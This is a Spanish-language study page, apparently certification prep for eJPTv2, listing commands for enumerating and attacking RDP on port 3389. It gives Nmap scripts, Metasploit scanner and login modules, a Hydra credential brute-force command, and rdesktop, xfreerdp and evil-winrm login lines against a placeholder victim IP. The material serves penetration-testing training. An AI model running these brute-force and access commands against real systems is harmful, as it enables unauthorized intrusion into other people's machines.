---
layout: default
title: Preparación EJPTv2
---


# 🔍 3389 - RDP

 RDP El puerto 3389 es utilizado por el servicio Remote Desktop Protocol (RDP), un protocolo de acceso remoto común en entornos empresariales y administrativos. Debido a su uso extendido, es un objetivo frecuente de ataques y auditorías de seguridad.

## 🛠️ Herramientas Principales:


- 🔍 Nmap + Scripts NSE: Enumeración y detección de vulnerabilidades.

- 🛠️ Metasploit: Explotación de fallos y acceso no autorizado.

- 🔧 Hydra: Ataques de fuerza bruta para credenciales.

- 📊 Rdesktop, XFreeRDP, Evil-WinRM: Acceso remoto y gestión de sesiones.

🕵️ Reconocimiento e Identificación del Servicio RDP Determinar la versión del servicio RDP es clave para detectar posibles vulnerabilidades.

```bash
nmap -p 3389 -sCV <ip_victima> # Escaneo para intentar ver la versión.
nmap -p 3389 --script rdp-enum-encryption <ip_victima> # Identificación de cifrado RDP.
nmap -p 3389 --script rdp-vuln-ms12-020 <ip_victima> # Detección de vulnerabilidad MS12-020.
nmap -p 3389 --script rdp-ntlm-info <ip_victima> # Extracción de información NTLM.
nmap -p 3389 --script rdp-brute <ip_victima> # Ataque de fuerza bruta a RDP.
```

###  🛠️Uso de Metasploit para Auditoría de RDP Enumeración de configuración y detección de vulnerabilidades.

```bash
msfconsole -q
use auxiliary/scanner/rdp/rdp_scanner # Escaneo de servicio RDP
set RHOSTS <ip_victima>
run
```

 Ataque de autenticación débil con Metasploit.

 ```bash
 use auxiliary/scanner/rdp/rdp_login
set RHOSTS <ip_victima>
set USER_FILE /ruta_diccionario_usuarios.txt
set PASS_FILE /ruta_diccionario_claves.txt
set THREADS 10
exploit
```

## 🔑 Fuerza Bruta al Servicio RDP Hydra

```bash
hydra -t 4 -V -f -L <wordlists_usenames.txt> -P <wordlists_password.txt> rdp://<ip_victima>
```

## 📊 Acceso Remoto y Gestión de Sesiones

Rdesktop

```bash
rdesktop -u <usuario> -p <contraseña> <ip_victima>
```

XFreeRDP

```bash
xfreerdp /v:<ip_victima> /u:<usuario> /p:<contraseña>
```

Evil-WinRM (para sesiones PowerShell remotas)

```bash
evil-winrm -i <ip_victima> -u <usuario> -p <contraseña>
```

<div style="text-align:center; font-size: 0.9em; margint-top: 40px; color: #33ff33;">
    💻 Hecho con 💚 por <strong>Marcela</strong> - 2025
</div>



